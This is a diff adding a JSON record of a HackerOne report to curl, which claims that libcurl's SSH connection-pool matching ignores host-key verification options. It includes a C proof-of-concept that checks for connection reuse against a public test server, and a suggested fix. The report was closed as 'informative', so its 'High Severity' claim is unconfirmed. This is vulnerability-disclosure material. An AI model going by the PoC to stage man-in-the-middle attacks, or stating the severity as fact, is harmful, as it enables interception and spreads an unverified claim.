@@ -1,0 +1,114 @@
+{
+  "id": 3639277,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjM5Mjc3",
+  "url": "https://hackerone.com/reports/3639277",
+  "title": "Bypassing Strict SSH Server Verification via Connection Pool Reuse in libcurl",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2026-03-31T07:09:06.111Z",
+  "submitted_at": "2026-03-31T07:09:06.159Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "whitehat411",
+    "url": "/whitehat411",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-03-31T21:48:48.117Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-03-31T21:48:36.010Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nThere is a logic flaw in how libcurl manages its connection pool for SSH protocols (SFTP/SCP). When evaluating an existing connection for reuse, `ssh_config_matches()` (in `lib/url.c`) fails to compare server identity verification policies. \n\nBy ignoring `CURLOPT_SSH_KNOWNHOSTS`, `CURLOPT_SSH_HOST_PUBLIC_KEY_MD5`, and `CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256` during the matching process, libcurl allows a handle with strict security requirements to reuse an existing, unverified, or MITM'd connection established by a previous relaxed handle.\n\n## Technical Details\n\n### The Flaw\nIn libcurl, connection reuse is governed by protocol-specific matching functions. While the TLS backend strictly enforces that security configurations (like `verifypeer`) must match between handles for a connection to be reused, the SSH backend lacks these checks.\n\nIn `lib/url.c`, the `ssh_config_matches` function only compares client-side RSA keys:\n\n```c\nstatic bool ssh_config_matches(struct connectdata *one,\n                               struct connectdata *two)\n{\n  struct ssh_conn *sshc1, *sshc2;\n\n  sshc1 = Curl_conn_meta_get(one, CURL_META_SSH_CONN);\n  sshc2 = Curl_conn_meta_get(two, CURL_META_SSH_CONN);\n  return sshc1 && sshc2 && Curl_safecmp(sshc1->rsa, sshc2->rsa) &&\n          Curl_safecmp(sshc1->rsa_pub, sshc2->rsa_pub);\n}\n```\n\nIt entirely omits the server verification policy options. If `Handle A` connects without host key verification and `Handle B` connects with strict verification, libcurl sees them as a \"perfect match\" because their client keys (often both NULL) are identical.\n\n### Attack Scenario\n1. **Handle A (Relaxed):** A routine connects to `sftp://example.com`. It does not enforce a `known_hosts` file. An attacker performs a Man-in-the-Middle (MITM) attack; the connection is established and added to the pool.\n2. **Handle B (Strict):** A separate routine handles sensitive data and connects to the same host. It explicitly sets `CURLOPT_SSH_KNOWNHOSTS` to a trusted file to prevent MITM.\n3. **The Bypass:** `ssh_config_matches()` evaluates the connection from Handle A. Since the client credentials match, it reuses the connection.\n4. **Impact:** Handle B bypasses the handshake entirely. It communicates over the MITM'd connection, ignoring the strict security policy set by the developer.\n\n## Proof of Concept (PoC)\nThe following C program demonstrates the bypass using a shared connection cache (`CURLSH`).\n\n```c\n#include <curl/curl.h>\n#include <stdio.h>\n\nint main(void) {\n  CURL *h1, *h2;\n  CURLSH *share;\n  long connects = 0;\n\n  curl_global_init(CURL_GLOBAL_DEFAULT);\n  share = curl_share_init();\n  curl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_CONNECT);\n\n  h1 = curl_easy_init();\n  h2 = curl_easy_init();\n\n  if(h1 && h2) {\n    /* Handle 1: Relaxed connection */\n    curl_easy_setopt(h1, CURLOPT_URL, \"sftp://demo:password@test.rebex.net/readme.txt\");\n    curl_easy_setopt(h1, CURLOPT_SHARE, share);\n    printf(\"--- Transfer 1 (Relaxed initial connection) ---\\n\");\n    curl_easy_perform(h1);\n\n    /* Handle 2: Security-critical connection */\n    curl_easy_setopt(h2, CURLOPT_URL, \"sftp://demo:password@test.rebex.net/readme.txt\");\n    curl_easy_setopt(h2, CURLOPT_SHARE, share);\n    \n    /* Strict policy: verify against a non-existent file (should fail) */\n    curl_easy_setopt(h2, CURLOPT_SSH_KNOWNHOSTS, \"non_existent_file.txt\");\n\n    printf(\"\\n--- Transfer 2 (Strict Policy Requested) ---\\n\");\n    curl_easy_perform(h2);\n\n    curl_easy_getinfo(h2, CURLINFO_NUM_CONNECTS, &connects);\n    if(connects == 0) {\n      printf(\"\\nVULNERABLE: Transfer 2 reused the relaxed connection from Transfer 1!\\n\");\n      printf(\"CURLOPT_SSH_KNOWNHOSTS was bypassed.\\n\");\n    } else {\n      printf(\"\\nNOT VULNERABLE: Connection reuse denied.\\n\");\n    }\n\n    curl_easy_cleanup(h1);\n    curl_easy_cleanup(h2);\n  }\n\n  curl_share_cleanup(share);\n  curl_global_cleanup();\n  return 0;\n}\n```\n\n## Suggested Mitigation\nModify `lib/url.c:ssh_config_matches()` to ensure that connections are only reused if the following security strings in `data->set.str[]` match:\n* `STRING_SSH_KNOWNHOSTS`\n* `STRING_SSH_HOST_PUBLIC_KEY_MD5`\n* `STRING_SSH_HOST_PUBLIC_KEY_SHA256`\n\n## Impact\n\n## Summary:\nThis is a **High Severity** authentication bypass. It breaks the security guarantees of host key pinning and `known_hosts` verification in multi-tenant or shared-pool environments (e.g., PHP-FPM, proxies, or applications using `CURLM`). An attacker can intercept sensitive SFTP/SCP data even when the application specifically requests encrypted and verified sessions.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 36,
+  "voters": [
+    "coder_mohammed",
+    "2026",
+    "yogisking_76",
+    "dpixls",
+    "vuln4n6",
+    "darlaterry",
+    "shaktiman176",
+    "protonpatcher",
+    "msgnoki",
+    "deivid20mb",
+    "and 26 more..."
+  ],
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
